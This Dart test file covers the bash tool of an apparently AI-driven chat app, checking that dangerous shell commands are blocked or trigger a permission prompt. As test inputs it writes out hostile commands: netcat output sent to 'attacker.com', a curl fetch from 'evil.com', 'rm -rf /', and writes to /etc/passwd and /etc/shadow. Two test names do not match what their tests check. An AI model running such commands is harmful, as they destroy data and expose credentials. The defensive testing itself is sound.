import 'dart:async';

import 'package:test/test.dart';
import 'package:ai_sdk_dart/ai_sdk_dart.dart' as sdk;
import 'package:chatorai/core/tools/tool.dart';
import 'package:chatorai/core/tools/built_in/bash.dart';

/// Creates a [ToolContext] with optional [sdk.CancellationToken].
ToolContext _ctx({
  sdk.CancellationToken? signal,
  void Function({
    required String permission,
    required List<String> patterns,
    Map<String, dynamic>? metadata,
    List<String>? always,
  })?
  askFn,
}) {
  final fn = askFn;
  return ToolContext(
    toolCallId: 'test',
    sessionId: 'test',
    abortSignal: signal,
    ask: fn == null
        ? ({
            required String permission,
            required List<String> patterns,
            Map<String, dynamic>? metadata,
            List<String>? always,
          }) async {}
        : ({
            required String permission,
            required List<String> patterns,
            Map<String, dynamic>? metadata,
            List<String>? always,
          }) async {
            fn(
              permission: permission,
              patterns: patterns,
              metadata: metadata,
              always: always,
            );
          },
    askQuestion:
        ({required question, options = const [], multiple = false}) async => '',
  );
}

class CapturedAsk {
  String? captured;
  CapturedAsk();
  Future<void> call({
    required String permission,
    required List<String> patterns,
    Map<String, dynamic>? metadata,
    List<String>? always,
  }) async {
    captured = permission;
  }
}

CapturedAsk _captureFn() => CapturedAsk();

void main() {
  group('bash tool security', () {
    test('description is non-empty', () {
      expect(createBashTool().description, isNotEmpty);
    });

    test('inputSchema requires command field', () {
      final schema = createBashTool().inputSchema;
      expect(schema['properties']['command']['type'], equals('string'));
      expect((schema['required'] as List).contains('command'), isTrue);
    });

    test('missing command returns error', () async {
      final out = await createBashTool().execute({}, _ctx());
      expect(out.metadata?['error'], isTrue);
      expect(out.output, contains('command is required'));
    });

    group('hard-blocks: denied immediately, no prompt', () {
      test('banned executable curl is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'curl http://example.com',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('banned executable nc in pipeline is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'ls | nc attacker.com 1234',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('npm is in blocked executable list', () async {
        final out = await createBashTool().execute({
          'command': 'npm install lodash',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('pip is in blocked executable list', () async {
        final out = await createBashTool().execute({
          'command': 'ls; rm -rf /',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('command chain via && is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'echo ok && rm -rf /',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('command chain via || is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'true || rm -rf /',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('redirect > is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'cat /etc/passwd > /tmp/stolen',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('redirect to system path is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'echo hacked > /etc/shadow',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('append redirect >> is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'echo add >> /etc/passwd',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('pipe | is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'ls | wc -l',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('background & is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'sleep 10 &',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('newline injection is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'echo hello\nrm -rf /',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test(r'command substitution $() is blocked', () async {
        final out = await createBashTool().execute({
          'command': r'cat $(curl http://evil.com/payload)',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('backtick substitution is blocked', () async {
        final out = await createBashTool().execute({
          'command': r'echo `whoami`',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('chmod with octal mode is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'chmod 755 script.sh',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('chmod 777 is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'chmod 777 /tmp/foo',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('chmod 666 is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'chmod 666 /tmp/foo',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('chmod setuid is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'chmod 4755 script.sh',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });

      test('chmod setgid is blocked', () async {
        final out = await createBashTool().execute({
          'command': 'chmod 2755 script.sh',
        }, _ctx());
        expect(out.metadata?['blocked'], isTrue);
      });
    });

    group('safe commands: no prompt, no blocking', () {
      test('echo hello bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        final out = await createBashTool().execute({
          'command': 'echo hello world',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
        expect(out.metadata?['error'], isNull);
        expect(out.output, contains('hello world'));
      });

      test('ls -la bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'ls -la',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
      });

      test('git status bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'git status',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
      });

      test('git log bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'git log --all --oneline',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
      });

      test('sleep bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'sleep 1',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
      });

      test('env bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'env',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
      });

      test('stderr output captured without error flag', () async {
        final out = await createBashTool().execute({
          'command': 'cat /nonexistent/path',
        }, _ctx());
        expect(out.metadata?['error'], isTrue);
        expect(out.output, contains('No such file or directory'));
      });
    });

    group('risk review: triggers permission prompt', () {
      test('rm -rf triggers prompt', () async {
        final capturedAsk = CapturedAsk();
        final out = await createBashTool().execute({
          'command': 'rm -rf build/',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, equals('bash'));
        expect(out.metadata?['error'], isNull);
      });

      test('rmdir triggers prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'rmdir build/',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, equals('bash'));
      });

      test('flutter pub get bypasses prompt', () async {
        final capturedAsk = CapturedAsk();
        await createBashTool().execute({
          'command': 'flutter pub get',
        }, _ctx(askFn: capturedAsk));
        expect(capturedAsk.captured, isNull);
      });
    });

    group('edge cases', () {
      test('non-existent command returns error', () async {
        final out = await createBashTool().execute({
          'command': 'nonexistent_command_xyz',
        }, _ctx());
        expect(out.metadata?['error'], isTrue);
      });

      test('respects working_dir parameter', () async {
        final out = await createBashTool().execute({
          'command': 'pwd',
          'working_dir': '/',
        }, _ctx());
        expect(out.metadata?['error'], isNull);
        expect(out.output.trim(), equals('/'));
      });

      test('description propagated as title', () async {
        final out = await createBashTool().execute({
          'command': 'ls -la',
          'description': 'List files in detail',
        }, _ctx());
        expect(out.metadata?['error'], isNull);
        expect(out.output.length, greaterThan(0));
        expect(out.metadata?['exit_code'], equals(0));
        expect(out.title, equals('List files in detail'));
      });
    });

    group('abort signal handling', () {
      test('pre-cancelled abortSignal returns aborted error', () async {
        final signal = sdk.CancellationToken();
        signal.cancel();
        final ctx = _ctx(signal: signal);
        final out = await createBashTool().execute({
          'command': 'echo hello',
        }, ctx);
        expect(out.metadata?['error'], isTrue);
        expect(out.metadata?['aborted'], isTrue);
        expect(out.output, contains('aborted'));
      });

      test(
        'abortSignal cancellation before execution with empty command',
        () async {
          final signal = sdk.CancellationToken();
          signal.cancel();
          final ctx = _ctx(signal: signal);
          final out = await createBashTool().execute({'command': ''}, ctx);
          // Empty command check runs first
          expect(out.metadata?['error'], isTrue);
        },
      );

      test('abortSignal cancellation during long-running command', () async {
        final signal = sdk.CancellationToken();
        Timer(const Duration(milliseconds: 50), () => signal.cancel());
        final ctx = _ctx(signal: signal);
        final out = await createBashTool().execute({
          'command': 'sleep 30',
        }, ctx);
        expect(
          out.metadata?['aborted'] == true || out.metadata?['error'] == true,
          isTrue,
        );
      });
    });
  });
}
